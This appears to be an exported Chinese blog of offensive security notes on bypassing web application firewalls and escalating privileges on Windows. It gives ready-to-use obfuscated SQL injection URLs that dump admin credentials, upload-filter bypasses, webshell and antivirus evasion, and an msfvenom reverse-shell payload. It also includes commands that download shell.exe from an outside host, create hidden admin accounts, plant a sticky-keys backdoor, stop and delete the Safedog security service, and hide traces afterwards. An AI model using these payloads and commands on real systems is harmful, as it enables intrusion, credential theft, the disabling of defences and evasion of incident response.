浅浅修改一下，反正思路就这样，多测试一下：http://192.168.0.200:8006/showproducts.php?id=-13/*SDJKF%26lt%3BSFDS*//*!44440union*//*SDJKF%26lt%3BSFDS*//*!44444%23*/%0a/*!44440%0aselect*//*SDJKF%26lt%3BSFDS*/1,database%23(%0a),3,4,5,6,7,8,9,10\n列表名：\nhttp://192.168.0.200:8006/showproducts.php?id=-13/*SDJKF%26lt%3BSFDS*//*!44440union*//*SDJKF%26lt%3BSFDS*//*%23*/distinct%0a/*!44440%0aselect*//*SDJKF%26lt%3BSFDS*/1,group_concat(table_name),3,4,5,6,7,8,9,10/*SDJKF%26lt%3BSFDS*/from/*SDJKF%26lt%3BSFDS*/information_schema.tables/*SDJKF%26lt%3BSFDS*/where/*SDJKF%26lt%3BSFDS*/table_schema=0x7879636D73\n列列名：\nhttp://192.168.0.200:8006/showproducts.php?id=-13/*SDJKF%26lt%3BSFDS*//*!44440union*//*SDJKF%26lt%3BSFDS*//*%23*/distinct%0a/*!44440%0aselect*//*SDJKF%26lt%3BSFDS*/1,group_concat(column_name),3,4,5,6,7,8,9,10/*SDJKF%26lt%3BSFDS*/from/*SDJKF%26lt%3BSFDS*/information_schema.columns/*SDJKF%26lt%3BSFDS*/where/*SDJKF%26lt%3BSFDS*/table_name=0x6D616E6167655F75736572\n列数据：\nhttp://192.168.0.200:8006/showproducts.php?id=-13/*SDJKF%26lt%3BSFDS*//*!44440union*//*SDJKF%26lt%3BSFDS*//*%23*/distinct%0a/*!44440%0aselect*//*SDJKF%26lt%3BSFDS*/1,group_concat(m_name,0x5c,m_pwd),3,4,5,6,7,8,9,10/*SDJKF%26lt%3BSFDS*/from/*SDJKF%26lt%3BSFDS*/manage_user\n分析一下上面的语句，可以得到绕过D盾以及安全狗总体思路：注释&amp;内联注释\n\n然后这里做一个简单的总结：\n如果服务器存在多个WAF（软件 waf），比如：D盾、安全狗、云锁、云盾、360、wts-waf 等等，首先我们需要考虑每个 waf 的绕过条件，编写脚本的时候需要注意 waf 拦截的优先级，以此来调用 bypass 脚本，然后要注意的是在多个waf tamper 联合使用的时候，要判断脚本的语句是否有冲突，如果有的话我们需要重新编写一个脚本\n\n这里再推荐一个切换代理的工具Auto_Tor_IP_changer-master，可以过掉硬件 waf 封锁 ip：\n\n这个使用的是本地的 9050 端口，我们在使用sqlmap扫描的时候，可以使用 --tor --proxy-type=SOCKS5 来指定，这里需要安装两个软件：sudo apt-get install tor provixy\n 菜刀拦截\n首先我们要使用 webshell 进行连接的话，首先得把 webshell 传到目标服务器，但是在对面有软件 waf 的情况下，这些木马会被检测出来，并且会被杀掉，所以我们要先对一句话进行免杀，比如通过编码、加密、函数、可变变量、类等等来达到免杀的目的，但是很多 waf 都会拦截菜刀，比如说：360、安全狗、云锁、阿里云等等，也就是说你哪怕把一句话传上去了，使用菜刀链接的时候还是会被拦截，所以我们就需要使用特定版本的菜刀，或者对菜刀的配置文件进行修改：\n\n然后这里再讲一个免杀的技巧：\n\n\n首先需要将木马写入到一个 txt 文件里面（这里以 php 大马为例），然后将开头以及结尾的&lt;?php以及?&gt;去掉，然后我们再写一个1.php，用来引用这个写入的 txt 文件，使用file_get_contents函数引用这个上传的 txt 木马，当然，也可以搞一台VPS，然后将这个 txt 文件上传到我们的VPS上面，之后使用 php 文件引用\n\n\n\n但是很明显，这样上传之后的文件是无法运行的，所以我们需要对文件进行修改，先修改一下1.txt 里面只有一个 eval 运行\n\n然后我们需要修改2.php文件，上面那些 define 都是从1.txt原本的木马文件上面复制过来的\n\n\n成功运行，然后我们使用安全狗扫描，可以看到 2.php 并没有被检测出来，但是D盾可以扫描出来：\n\n\n\n 改包过 waf\n下面这个是可以过安全狗的：\n在filename后面加上换行，比如这里就是在第一个双引号后面加的换行，也可以在双引号前换行，还可以点后换行加一个截断\n\n\n也可以交换一下filename和name的位置，然后就是可以去掉from-data，或者使用长度截断，多加几个垃圾字符\n\n也可以直接把content-type全部删除测试一下\n\n还有就是修改一下-的数量\n\n还有就是在filepath后面加上一个截断（%00，然后编码），可以看到a.asp上传成功\n\n也可以尝试多写几个filename ，然后使用分号隔开\n\n主要还是要脑洞大开，也可以吧双引号修改为单引号，去掉双引号，等等等\n然后将上面的方法总结一下：\n\n\n去掉引号\nContent-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;Content-Disposition: form-data; name=file_x; filename=xx.phpContent-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php\n\n\n双引号变成单引号\nContent-Disposition: form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;\n单引号、双引号、不要引号，都能上传。\n\n\n大小写\n对这三个固定的字符串进行大小写转换：\n\nContent-Disposition\nname\nfilename\n\n例如：name 转换成 Name，Content-Disposition 转换成 content-disposition\n\n\n空格\n在 :，; 和 = 添加1个或者多个空格，不过测试只有 filename 在 = 前面添加空格，上传失败。\n在 filename= 后面添加空格\n\n\n去掉或修改 Content-Disposition 值\n有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。\nContent-Disposition: name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;\n\n\n交换 name 和 filename 的顺序\n规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。\nContent-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x\n\n\n多个 boundary\n最后上传的文件是 test.php 而非 test.txt，但是取的文件名只取了第一个就会被Bypass。\n-----------WebKitFormBoundaryj1oRYFW91eaj8Ex2------------Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;Content-Type: text/javascript\n\n\n多个 filename\n最终上传成功的文件名是 test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。\nContent-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;\n\n\n多个分号\n文件解析时，可能解析不到文件名，导致绕过。\nContent-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;\n\n\nmultipart / form-DATA\n这种绕过应该很少，大多数都会忽略大小写。php 和 java 都支持。\nContent-Type: multipart/form-DATA\n\n\nHeader 在 boundary 前添加任意字符\n这个只能说，PHP支持。试了JAVA会报错。\nContent-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2\n\n\nfilename 换行\nPHP支持，Java不支持。\nContent-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;\n下面这种 PHP 也支持。\nfilename\n\n\nname 和 filename 添加任意字符串\nPHP上传成功，Java上传失败。\nContent-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;\n\n\n\n个人之前总结的30个上传绕过姿势：\n\nfilename 在 content-type 下面\n.asp{80-90}\nNTFS ADS\n.asp…\nboundary不一致\niis6 分号截断 asp.asp;asp.jpg\napache 解析漏洞 php.php.ddd\nboundary 和 content-disposition 中间插入换行\nhello.php:a.jpg 然后 hello.&lt;&lt;&lt;\nfilename=php.php\nfilename=“a.txt”;filename=“a.php”\nname=\\n&quot;file&quot;;filename=“a.php”\ncontent-disposition:\\n\n.htaccess文件\na.jpg\\nphp\n去掉 content-disposition 的 form-data 字段\nphp&lt;5.3 单双引号截断特性\n删掉content-disposition: form-data:\ncontent-disposition\\00:\n{char}+content-disposition\nhead 头的 content-type: tab\nhead 头的 content-type: multipart/form-DATA\nfilename 后缀改为大写\nhead 头的 Content-Type: multipart/form-data;\\n\n.asp空格\n.asp0x00.jpg 截断\n双 boundary\nfile\\nname=“php.php”\nhead 头 content-type 空格:\nform-data 字段与 name 字段交换位置\n\n\n 免杀\n之前我们了解过 MSF 的相关知识，首先我们要知道 MSF 能干什么：\n\n提权\n内网渗透\n维持控制\n\n然后我们要知道的是，在服务器上面会有很多杀软，比如说：360、火绒、nod32、卡巴斯基，我们一旦上传 payload，就会被杀软杀掉，所以我们要思考的就是如何过掉杀软，这个时候就要学习免杀\n shellter免杀\n使用 shellter 工具进行免杀，可以绕过很多杀软，但要是想让功能更强的话，可以使用收费版\n 免杀 msfpayload\n首先肯定是使用 msfvenom 生成 python 木马：\nmsfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.8.124 -i 11 -f py -o msf.py\n\n\nmsfvenom：这是一个用于生成各种类型的有效载荷（payload）的工具，通常与 Metasploit 框架一起使用。\n-p windows/meterpreter/reverse_tcp：指定要生成的有效载荷类型。在这里，选择的是 Windows 平台的 Meterpreter 反向 TCP 连接。这意味着一旦目标机器运行了这个有效载荷，它将会尝试连接回攻击者的机器。\nLPORT=4444：指定反向连接时使用的本地端口号。在这个例子中，攻击者的机器将监听 4444 端口。\nLHOST=192.168.8.124：指定攻击者的主机 IP 地址，目标机器在执行有效载荷时会连接到这个地址。\n-i 11：指定生成的有效载荷的编码迭代次数。这里设置为 11 次，目的是增加有效载荷的复杂性，以绕过某些安全检测。\n-f py：指定输出格式为 Python 脚本。\n-o msf.py：指定输出文件的名称为 msf.py，即生成的 Python 脚本将保存为这个文件名。\n\n\n然后就是建立监听，使用multi/handler脚本，之后使用其他的一些脚本对我们刚刚生成的 python 脚本再次进行编码，或者是写入一些垃圾字符，以此来绕过一些 waf 的检测\n venom 免杀 payload\n\nhttps://github.com/r00t-3xp10it/venom/releases/tag/v1.0.17.7\n shecodject 免杀\nhttps://github.com/TaroballzChen/shecodject\n这个其实就是自动化生成 python 脚本然后进行免杀\n 提取过waf\n\n通过程序读密码\n利用 waf 绕过神器\n利用 exp 读 hash\n将用户添加到远程桌面组，并且给目录降权\nsa sqlserver system\n直接把 waf 服务或者进程给他干掉\n利用第三方软件提权\n\n 补充\n要是碰到杀软的话，我们其实可以尝试一些 ps 脚本，也就是 powershell 的一些脚本，也可以使用无文件攻击，msf+加载 powershell，当然也可以尝试一下 empire，这个虽然现在下载有点困难。。。但是之前了解过一点，感觉还是很靠谱的，尤其是打Windows 的时候，并且他的很多脚本啥的都是带有一定的免杀效果的，说不定就可以过掉杀软，还有就是 powersploit\n除此之外，我们也可以找一些源码编译使用，或者直接找免杀的程序使用，比如说：掩日、shellter、shecodject 等等\n","tags":["免杀"]},{"title":"windows提权","url":"/2025/02/03/windows%E6%8F%90%E6%9D%83/","content":"\n我们通过各种漏洞拿到了shell，获取了webshell的权限就可以对网站进行任意修改，但是我们需要获取服务器的管理员权限，也就是系统权限，用户的权限分三种：\n\n网络服务用户权限\nwebshell（对网站修改）\n系统权限（管理员权限 Windows_System Linux_root权限）\n\n想要拿到系统权限就需要进行提权\n\n\n通常脚本所处的权限：\n\nasp、php\t网络服务用户\naspx    普通用户权限，一般可以调用 cmd\njsp    管理员权限（管理员运行的容器）\n\n脚本所处的权限取决于运行容器的用户身份，就比如使用 phpstudy 搭建的站点就是 system 权限\n假如说现在的网站一共有三个站点，一个是使用 IIS 搭建的 asp 的站点，一个是使用 Tomcat 搭建的 jsp 的站点，还有一个是使用 PHP 搭建的站点。然后我们通过 asp的脚本拿到了 IIS搭建的webshell，同时我们可以在连接之后访问到 Tomcat 的根目录以及 phpstudy 的根目录，同时具有写入权限，那我们就可以尝试将木马写入到这些容器的根目录，借助这种高权限的容器，我们就可以间接性的提权\n\n 提权之前的准备\n 收集信息\n然后就是收集信息，假如说我们拿到的网站 shell 是一个外网的网站，那我们就可以将 3389端口开放直接连接，但是如果是一个内网的 ip，那我们就需要使用 MSF 进行端口转发，当然也可以使用 lcx，因为我们可以访问到内网本质上是因为管理员使用了防火墙或者路由器进行了转发，比如我们访问了外网的一个地址（80端口），通过管理员所做的策略，转发到了内网的某一台主机上面，这样我们才可以访问到内网的一台主机上面，假如说这台内网的主机开启了 3389，但是路由器或者防火墙没有做映射的话，我们通过外网的 web 地址是无法访问到的，这个时候就需要使用 MSF 进行端口转发，将这个端口转发到公网的一个 VPS 上面，然后我们直接连接 VPS，就可以连接到内网的这台主机（使用 portfwd）\nportfwd add -l 6378 -p 6379 -r 127.0.0.1  # 将靶机上面的6379端口转发到本地的6378端口\n\n\n还要看服务器的系统以及版本的位数（X64、X32）\n\n\n还可以查看一下系统的补丁情况，使用命令：systeminfo ，一般情况下 300 个补丁程序就是节点，多了我们就没有必要继续往下看了，我们可以多尝试在补丁上面寻找漏洞，有些补丁如果没有的话，那我们就可以利用相关的漏洞对目标进行攻击，下面这是我自己电脑的补丁，这是系统自己装的\n\n所以像公司、企业里面，应该把防火墙都打开，不单单要把外网的防火墙打开，还要把内网的防火墙也打开，因为攻击者的攻击手段不单单只有扫描，还可以通过钓鱼拿到内网的一台主机然后进行内网的横向渗透，所以我们需要在内网把防火墙也打开\n\n\n查看一下服务器的安装软件情况以及防护软件情况\n可以查看一下进程：tasklist，看看进程里面运行着哪些服务软件，也可以看一下默认的安装目录，至于软件防护，也可以直接看看进程，找一下相关的防护软件\n\n\n端口情况\nnetstat -an 直接查看，这个时候就有人问了，为什么不直接在外网进行端口扫描，因为在防火墙打开的情况下，直接进行端口扫描得到的都是防火墙开放的端口，并不是真正的 web 服务器。那假如说我的 web 服务器就是开放到外网上面的，那扫描到的端口和我服务器开放的端口是否是一样的？其实也是不一样的，因为有些端口只是监听在内网上面或者 127.0.0.1 上面\n使用这条命令还可以看到很多内网链接，这个内网链接也很重要，因为一些大一点的机构网络都是 站库分离 的，很多时候我们拿到了 web 服务器，但是数据库并不在这里，这个时候我们就可以通过 netstat 看一下他链接的哪一台服务器，比如说连接的是地址为：192.168.19.123:3306，这说明连接的是内网的一个 mysql 数据库，或者是 1521 oracle数据库，所以这个可以便于我们发现更多的主机\n假如说我们现在的网段是：192.168.0.100，但是我们使用命令之后看到里面有其他网段的地址，比如说：192.168.1.200，这个属于是1网段的，这些都属于可以通过内网的一些路由器过去的网段，这样就可以找到内网当中的不同的网段\n\n\n支持脚本的情况\n假如说我们现在拿到的 webshell 是 asp 站点的，也就是 asp 后缀的，但是有些时候我们想在 asp 里面执行 cmd 没用，上传 cmd 也是无法执行的，这是因为他把相关的组件禁用了，但是这个只针对 asp，这个时候就可以尝试更换脚本，比如说：可以上传aspx 的脚本，因为 aspx 是可以调用系统的 cmd 的，当然也可以尝试上传 php脚本，如果 php的某些函数没有被禁用的话也是可以调用 cmd 的\n\n\n 信息收集常用的命令\n\nWindows：\n\nipconfig /all 查看当前IP\nnet user 查看当前服务器账号情况\nnetstat -ano 查看当前服务器端口开放情况\nver 查看当前服务器操作系统\nsysteminfo 查看当前服务器配置信息（补丁情况）\ntasklist /svc 查看当前服务器进程情况\ntaskkill -PID pid号 结束某个 pid 号的进程\ntaskkill /im qq.exe /f 结束 qq 进程\nnet user cracer cracer /add  添加一个用户名为 cracer 密码为 cracer 的用户\nnet localgroup administrators cracer /add 将用户 cracer 添加到管理员组\nwhoami 查看当前操作用户（当前权限）\n\n\nLinux：\n\nls -al 查看当前目录下的文件和文件夹\npwd 查看当前操作路径\nuname -a 查看当前服务器内核信息\n\n\n\nnet user # 查看系统账号net localgroup administrators # 查看当前管理员组里面有哪些成员，也就是查看管理员账号query user # 查看哪些账号在登录状态qwinsta # 查看当前登录的用户会话，和query user作用一样，如果有一个不能用就用另一个代替\n\n\n假如说我们想要查看这个用户的详细信息，就可以使用命令：net user xxx （xxx 就是账户名称），比如说：\n\n这里就有一个小问题，我们怎么判断我们的用户是不是黑客在我们电脑创建的恶意用户？这个时候就可以使用这条命令，可以查看一下用户创建的时间，因为管理用户是和系统一起创建的，所以时间如果是近期就说明这个用户为恶意用户，当然也可以看一下用户是否被启用，如果有两个管理员账号，但是一个禁用一个启用也是正常的，比如我的就是，Administrator 用户就是禁用的\n\n当我们拿到一个shell之后，一定要执行：whoami，这个命令是用来查看当前用户的身份的，并且在 Windows 以及 Linux 都是可以执行的，以此来判断现在的权限\n\n\n@echo off # 放在脚本开头，用来关闭命令回显，将结果统一输出echo #########system info collectionsysteminfoverhostnamenet usernet localgroupnet localgroup administratorsnet usér guestnet user administratorecho #######at- with atqi#####echo schtask /query\n@echo offechoecho ####task-list##HHHHHHHEH HHHtasklist /svcechoecho ####net-work infomationipconfig/allroute printarp -anetstat -anipconfig /displaydnsechoecho ######H Services Hattsc query type= service state= allecho #######file ##teHteHeeeeeecd\\tree -F\n然后就是对上述脚本中提取的命令和操作的解释：\n\n系统信息收集：\n\nsysteminfo：查看系统配置信息。\nver：查看操作系统版本。\nhostname：查看主机名。\n\n\n用户和组信息：\n\nnet user：查看用户账户信息。\nnet localgroup：查看本地组信息。\nnet localgroup administrators：查看管理员组成员。\nnet usér guest：查看Guest用户信息（注意拼写错误，应为net user guest）。\nnet user administrator：查看Administrator用户信息。\n\n\n计划任务：\n\nschtask /query：查看计划任务。\n\n\n进程信息：\n\ntasklist /svc：查看当前进程及其服务信息。\n\n\n网络信息：\n\nipconfig /all：查看详细的网络配置。\nroute print：查看路由表。\narp -a：查看ARP表。\nnetstat -an：查看网络连接状态以及开放的端口。\nipconfig /displaydns：查看DNS缓存。\n\n\n服务信息：\n\nsc query type= service state= all：查看所有服务状态。\n\n\n文件系统信息：\n\ncd\\：切换到根目录。\ntree -F：以树状结构显示目录内容。\n\n\n\n 下载文件到服务器\n在拿到 shell 之后，可以利用下面这些命令进行自动化文件下载任务，下载一些恶意文件，但是记得做免杀，可以尝试使用 CS的一些脚本或者是 ps1 的脚本\nbitsadmin /transfern http://www.cracer.com/shell.exe d:\\shell.exe\n\nbitsadmin 是一个 Windows 命令行工具，用于创建、管理和监视下载或上传作业\n/transfern 是创建一个新的下载作业。\nhttp://www.cracer.com/shell.exe 是要下载的文件 URL\nd:\\shell.exe 是文件下载后保存的路径和文件名。\n\npowershell (new-object system.net.webclient).DownloadFile(&#x27;http://www.cracer.com/x.exe&#x27;, x.exe&#x27;)\n\npowershell 是 Windows 的命令行 shell 和脚本语言\n(new-object system.net.webclient) 创建一个新的 WebClient 对象，用于从 Web 服务器下载数据\n.doanloadfile('http://www.cracer.com/x.exe', x.exe') 是调用 WebClient 对象的 DownloadFile 方法，从指定的 URL 下载文件并保存为x.exe\n\n除了上面这种方法，我们还可以使用 nc 来上传文件，如果检测的比较严格的话，我们可以尝试更改文件后缀来进行上传，比如说：我们想要上传一个 cmd.exe，但是很明显，这个大概率会被拦截，这个时候，我们就可以将后缀修改为.jpg、.aaa等等等等，并且我们调用的时候是可以直接调用修改之后的文件的，虽然文件的后缀被修改了，但是 windows 是可以识别文件的 PE 结构的，所以就算后缀名被修改了，我们依旧可以直接调用。\n然后就是使用 nc 上传文件的方法：\n\n\n在接收端（服务器）：\n启动 nc 监听端口并准备接收文件：\nnc -l -p 1234 &gt; received_file\n\n-l：让 nc 监听指定端口。\n-p 1234：指定监听的端口号（这里以 1234 为例）。\n&gt; received_file：将接收到的数据保存到 received_file 文件中。\n\n\n\n在发送端（客户端）：\n使用 nc 发送文件：\nnc &lt;服务器IP&gt; 1234 &lt; file_to_send\n\n&lt;服务器IP&gt;：替换为接收端服务器的 IP 地址。\n1234：与接收端监听的端口号一致。\n&lt; file_to_send：指定要发送的文件。\n\n\n\n示例：\n假设服务器 IP 是 192.168.1.100，文件名为 example.txt。\n\n\n在服务器上：\nnc -l -p 1234 &gt; example.txt\n\n\n在客户端上：\nnc 192.168.1.100 1234 &lt; example.txt\n\n\n\n\n 上马连接执行命令\n当我们连接到目标之后，准备调用系统的 cmd 查看一下相关信息的时候，执行命令之后弹出：\n\n\n这说明我们的 cmd 是无法执行的，那可能的原因是什么？\n\n防护软件拦截\ncmd 被降权\n组件被删除\n虚拟主机无 cmd 调用\n\n然后就是解决方案：\n\n\n找可读写目录上传 cmd.exe，将执行的 cmd.exe 路径替换成上传的路径，再次调用执行。\n\n\n如果实在不行的话，就可以考虑更换脚本 /aspx/php\n\n\n\n这个时候我们就可以找一个具有可写权限的目录，然后上传一个cmd.exe文件，然后使用我们新上传的 cmd.exe 文件执行命令\n\n\n这里我们上传一个大一点的 aspx 的木马，这种一般连上之后的权限都很高，我们上传之后依旧调用系统的 cmd 来执行命令，可以看到命令成功执行，这就说明刚刚是被降权了\n\n 查找 3389\n\n注册表读取\n工具扫描\n命令探针\n\n Windows 提权\n 利用应用程序提权\n常见的服务器程序：\n\n\nFTP软件：\n\nServer-U\ng6ftp\nFileZilla\n\n\n\n远程管理软件：\n\nPCanywhere\nRadmin\nVNC\n\n\n\n一般情况下，这种使用第三方软件搭建的 FTP 服务，都有测试账号，并且 账密大概率都是一样的 ，这个时候就可以尝试使用弱口令进行爆破：ftp、test、ceshi，反正是可以找到的都可以试试，同时，这种账号的权限非常大\n Server-U 提权\n假如我们使用 ftp 连接到了目标，然后就可以执行命令来创建一个用户，并且将其放到管理员组：quote site exec net user a a /add quote site exec net user localgroup administrators a /add\n然后我们看一下得到的密码的格式：\n\ncqDEBBBFD7E64EBD64B91728F764499580 # 密码cqtest\n将后面的DEBBBFD7E64EBD64B91728F764499580进行 md5 解密之后得到 test，然后前面的cq就是盐，我们使用这个加密得到结果之后在前面加上解密用的盐，然后盐和密文使用大小写区分开来\n然后还有一种提权方法就是使用 Serv-U FTP，我们可以借助他的管理员账密创建一个新的 FTP 账号，并且这个账号是具有 System权限的，至于这里的系统口令，也就是密码，如果没有被修改就可以直接用，但是如果被修改了的话，我们可以找到ServUAdmin.exe文件，然后使用十六进制的工具，比如 010 打开，然后查找账号，后面跟着的就是密码\n\n\n\nserver-u 提权：\n\n\n有修改权限：\n\n检查是否有可写权限修改server-u默认安装目录下的ServUDaemon.ini\n增加用户\n连接\n执行命令\n\nquote site exec net user cracer cracer.com /add\nquote site exec net localgroup administrators cracer /add\n\n\n无修改权限：\n暴力破解 md5\n溢出提权\n\n\n\n G6ftp 提权\n\n\n下载管理配置文件，将 administrator 管理密码破解\n\n\n使用 lcx 端口转发（默认只允许本机连接）\n\n可以看到他只允许在本机的 127.0.0.1上面使用服务端软件登录（08虚拟机 192.168.0.200）\nlcx.exe -tran 8222 127.0.0.1 8021\n\n然后我们在 Windows7（192.168.0.117）上面也下载一个服务端软件，同时新建一个连接，将端口修改为转发后的8222\n\n转发之后我们尝试连接，可以看到已经成功连接了（这一步链接是需要账号以及密码的）\n\n然后我们创建一个新用户，将权限选为 All\n\n\n然后我们新建一个站点命令，执行一个批处理文件，将下列命令放到批处理文件里面：\nnet user x 123.com /add net localgroup administrators x /add 保存为 x.bat\n\n然后我们将这个批处理文件上传上去，然后直接执行刚刚设置的站点命令：quote site useradd\n\n这么一来，这个 x 用户就被加入到管理员组了，提权成功\n\n\n filezilla 提权\n\nfilezilla 是一款开源的 FTP 服务器和客户端的软件。\n若安装了服务器端默认只侦听 127.0.0.1 的 14147 端口\n并且默认安装目录目录下有两个敏感文件 filezillaserver.xml（包含了用户信息）和 filezillaserver interface.xml（包含了管理信息）\n提权思路：\n\n下载这个两个文件，拿到管理密码\n配置端口转发，登录远程管理 ftpserve，创建 ftp 用户\n分配权限，设置家目录为C:\\\n使用 cmd.exe 改名为 sethc.exe 替换 c:\\windows\\system32\\sethc.exe 生成 shift 后门\n\n\n连接3389按5次 shift 调出 cmd.exe\n\n依旧是在拿到 shell 之后寻找密码，可以看到这个密码什么都没写，说明就没有密码\n\n密码不需要填写，然后连接到通过端口转发的 14148 端口\n\n然后我们转发端口之后进行连接，可以看到连接成功了\n\n\n登录进来之后就可以创建一个新的用户，创建完之后添加一个新密码，然后设置共享文件夹，将整个 C 盘设置为共享文件夹，同时将权限全部设置上（服务端）\n\n\n\n然后是客户端，我们直接连接登录上去\n\n然后我们将一个cmd.exe 改名为 sethc.exe，然后将原本的这个程序替换，这个程序其实就是粘滞键，然后我们替换之后，就可以通过连续点击 5 次 shift 将终端打开\n\n假如说目标开启了 3389，我们就可以远程连接目标，然后连续点击 5 次 shift，可以看到终端出来了\n\n然后我们执行命令：taskmgr 可以调用任务管理器，explorer.exe 可以直接呼出桌面，都不需要登录了\n\n但是这个只适用于03，切换为08就无法成功了，这个时候就可以使用另外一种方法，我们可以使用 MSF 或者 CS 生成一个 payload，然后将其与 cmd 捆绑替换，这么一来，只要管理员调用 cmd，那么 payload 就会执行，那假如管理员不用 cmd 呢？这个简单，只要是系统加载界面就需要调用 explorer.exe，那我们直接将这个程序和 payload 捆绑就可以\n说了这么多，其实只要是系统必须要调用的文件都可以进行捆绑，就比如一些 dll 文件，就可以进行 dll 劫持提权\n 远程管理软件提权\n\n我们可以在目标上面的 pcAnywhere 管理端新添加一个被控端，然后添加一个新的被控端\n\n在 pcAnywhere 的目录下面找到文件PCA.admin.CIF （中间那个admin是用户名），然后使用这个文件破解账号以及密码\n\n\n因为 Windows7 安装不了，所以我们就直接自己链接自己吧，主控端添加自己的 IP，然后输入账密就可以连接\n\n\n radmin 提权\n通过端口扫描扫描 4899 端口，上传 radmin.asp 木马读取 radmin 的加密密文，最后使用工具连接（注意将密文转为小写）\n\n\n vnc 提权\n通过读取注册表十进制数，然后转换成十六进制数\n\n破解十六进制数得到密码，vncx4.exe -W 然后输入转换后的十六进制数，就可以得到密码，最后下载一个客户端直接连接 vnc\n\n\n拥有高权限的 web 容器及中间件：\n\nwinmail server\nphpstudy\nwamp\nupupw\ntomcat\nStrus2\njava反序列漏洞\n\n我们可以尝试劫持这些高权限的容器，然后往容器里面写木马\n\n 数据库提权\nsqlserver 数据库提权、MySQL 数据库提权，需要具备数据库管理员权限才可执行提权操作\n\n前提条件：\n\n\n拥有数据库管理员账号密码权限\n\n\nWindows系统下（没有被降权）\nzkeys下面的 mysql 的权限就被降权为服务用户权限，还有就是宝塔，也可能会被降权\nLinux 下 mysql 的 root 权限是服务用户权限，很小，不能提权\n\n\n\n mssql 提权\n\nsqlserver 的 sa 账号获取方法：\n\n爆破\n查找网站源码数据库链接文件（web.config conn.asp/aspx config.asp/aspx dbconfig.asp/aspx）\n\n如果我们拿到的账号为：xycms（不是 sa，但是这不代表不是 sa 权限），如果有注入的话，我们就可以使用 sqlmap执行命令：sqlmap --is-dba 如果是 true，说明就是 sa 权限（系统权限），如果没有注入，我们就可以对四大类数据库进行一系列数据库操作，如果可以执行成功就说明是 sa 权限（用户名就是 sa）\n一般情况下，sa 登录是允许外部地址登录的，但是 mysql 的 root 账号默认是不允许外部地址登录的\n\nmssql 提权方法：安装组件、开启3389、创建用户、提升权限、sa 账号的获取，去查看 config.asp,conn.asp 等文件。\n假设我们现在已经获取到了mssql 的账号以及密码，然后在它允许外连的前提下，我们可以尝试使用 sql TOOLS工具进行连接：\n\n可以看到连接成功了，然后我们尝试执行命令，但是可以看到，xp_cmdshell 组件被禁用了，这个时候我们就可以使用 MSSQL查询分析器进行连接尝试，但是这个工具只能在 Windows7 使用\n\n\n然后我们执行命令，将组件启用\n\n# 安装cmd_shell组件EXEC sp_configure &#x27;show advanced options&#x27;, 1GORECONFIGUREGOEXEC sp_configure &#x27;xp_cmdshell&#x27;, 1GORECONFIGUREGO# 删除cmd_shell组件EXEC sp_configure &#x27;show advanced options&#x27;, 1GORECONFIGUREGOEXEC sp_configure &#x27;xp_cmdshell&#x27;, 0GORECONFIGUREGO\n\n组件开启成功之后我们再次返回去执行系统命令，可以看到命令执行成功，然后我们就可以使用命令创建一个账户，同时加入到管理员组，之后再使用命令给目标开启 3389端口，然后直接使用 mstsc 连接目标\n# 开启3389exec master.dbo.xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\\CurrentControlSet\\Control\\Terminal Server&#x27;,&#x27;fDenyTSConnections&#x27;,&#x27;REG_DWORD&#x27;,0;--# 关闭3389exec master.dbo.xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\\CurrentControlSet\\Control\\Terminal Server&#x27;,&#x27;fDenyTSConnections&#x27;,&#x27;REG_DWORD&#x27;,1;--\n\n当我们测试完之后，需要将之前开启的组件以及端口全部关闭掉，防止被人发现然后溯源\n 绕过安全狗提权\n# system权限的情况下：net stop &quot;safedog guard center&quot; /ynet stop &quot;safedog update center&quot; /ynet stop &quot;safedogguardcenter&quot; /y# 删除安全狗服务(关闭开机自启动)：sc stop &quot;SafeDogGuardCenter&quot;sc config &quot;SafeDogGuardCenter&quot; start=disabledsc delete &quot;Safedogguardcenter&quot;sc stop &quot;SafeDogupdateCenter&quot;sc config &quot;SafeDogUpdateCenter&quot; start=disabledsc delete &quot;SafedogUpdatecenter&quot;sc stop &quot;SafeDogCloudHeler&quot;sc config &quot;SafeDogCloudHeler&quot; start=disabledsc delete &quot;SafeDogCloudHeler&quot;\n我们要清楚一点就是，安全狗他不会拦截你创建账号，但是他会拦截你将账号加入到管理员组，所以我们可以尝试加入到其他的组里面，就比如下面的远程桌面组，但是加入这个组之后，我们进行登录还是普通用户，就比如说 C 盘的一些敏感目录我们还是无法进行访问，这个时候我们就需要对文件进行降权：cacls C: /e /t /g everyone:F（ 这个命令的作用是递归地修改C盘根目录及其所有子目录和文件的权限，授予“Everyone”用户组完全控制权限，而不删除现有的权限设置 ）这样就可以访问了\n\n\n如果说 SqlServer 不允许外连，那我们就可以上传一些大马进行连接，然后执行命令开启组件，开启组件之后就可以尝试执行命令了\n# 1433 SQL入侵恢复 xp_cmdshell 方法总结:# sql server 2005下开启xp_cmdshell的方法EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;# 关闭，下面的同理，将1改为0EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,0;RECONFIGURE;# SQL2005开启&#x27;OPENROWSET&#x27;支持的方法:exec sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;exec sp_configure &#x27;Ad Hoc DistributedQueries&#x27;, 1;RECONFIGURE;# 